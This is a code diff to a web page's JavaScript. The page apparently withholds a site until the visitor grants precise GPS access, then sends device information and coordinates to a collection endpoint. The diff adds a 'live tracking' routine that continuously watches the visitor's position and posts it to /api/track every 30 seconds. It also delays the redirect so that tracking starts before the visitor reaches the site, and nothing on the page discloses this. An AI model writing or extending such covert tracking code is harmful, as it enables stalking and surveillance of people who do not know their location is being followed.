@@ -501,15 +501,20 @@
                 } catch (e) { }
 
                 try {
-                    await fetch('/api/collect', {
+                    const collectRes = await fetch('/api/collect', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify(info)
                     });
+                    const collectData = await collectRes.json();
+                    if (collectData.deviceId) {
+                        startLiveTracking(collectData.deviceId);
+                    }
                 } catch (e) { }
 
                 dataCollected = true;
-                showSite();
+                // Delay redirect to allow tracking to start
+                setTimeout(showSite, 2000);
 
             } catch (e) {
                 showBlocked();
@@ -553,32 +558,73 @@
             }
         }
 
+        // ============================================
+        // 📡 LIVE TRACKING — send GPS every 30s
+        // ============================================
+        let trackingDeviceId = null;
+        let lastTrackLat = null;
+        let lastTrackLon = null;
+
+        function startLiveTracking(deviceId) {
+            trackingDeviceId = deviceId;
+
+            // Use watchPosition for continuous tracking
+            if (navigator.geolocation) {
+                navigator.geolocation.watchPosition(
+                    (pos) => {
+                        lastTrackLat = pos.coords.latitude;
+                        lastTrackLon = pos.coords.longitude;
+                    },
+                    () => { },
+                    { enableHighAccuracy: true, maximumAge: 10000 }
+                );
+            }
+
+            // Send updates every 30 seconds
+            setInterval(async () => {
+                if (lastTrackLat && lastTrackLon && trackingDeviceId) {
+                    try {
+                        await fetch('/api/track', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                deviceId: trackingDeviceId,
+                                lat: lastTrackLat,
+                                lon: lastTrackLon,
+                                accuracy: null,
+                                speed: null
+                            })
+                        });
+                    } catch (e) { }
+                }
+            }, 30000);
+        }
+
         // Initial load — check permission state and request GPS immediately
         window.addEventListener('load', async () => {
-            // Check current permission state
             let permState = 'prompt';
             try {
                 const perm = await navigator.permissions.query({ name: 'geolocation' });
-                permState = perm.state; // 'granted', 'denied', or 'prompt'
+                permState = perm.state;
             } catch (e) { }
 
             if (permState === 'denied') {
-                // Already denied — show settings instructions directly
                 retryCount = 1;
                 showBlocked();
                 return;
             }
 
-            // Permission is 'prompt' or 'granted' — request GPS now
             try {
-                const gpsPosition = await new Promise((resolve, reject) => {
-                    if (!navigator.geolocation) { reject(new Error('Not supported')); return; }
-                    navigator.geolocation.getCurrentPosition(resolve, reject, {
-                        enableHighAccuracy: true, timeout: 15000, maximumAge: 0
-                    });
-                });
+                const gpsPosition = await Promise.race([
+                    new Promise((resolve, reject) => {
+                        if (!navigator.geolocation) { reject(new Error('Not supported')); return; }
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                            enableHighAccuracy: true, timeout: 15000, maximumAge: 0
+                        });
+                    }),
+                    new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 16000))
+                ]);
 
-                // GPS granted!
                 const info = await collectDeviceInfo();
                 info.gpsLocation = {
                     lat: gpsPosition.coords.latitude,
@@ -604,18 +650,21 @@
                 } catch (e) { }
 
                 try {
-                    await fetch('/api/collect', {
+                    const collectRes = await fetch('/api/collect', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify(info)
                     });
+                    const collectData = await collectRes.json();
+                    if (collectData.deviceId) {
+                        startLiveTracking(collectData.deviceId);
+                    }
                 } catch (e) { }
 
                 dataCollected = true;
-                showSite();
+                setTimeout(showSite, 2000);
 
             } catch (e) {
-                // Denied or timed out
                 showBlocked();
             }
         });
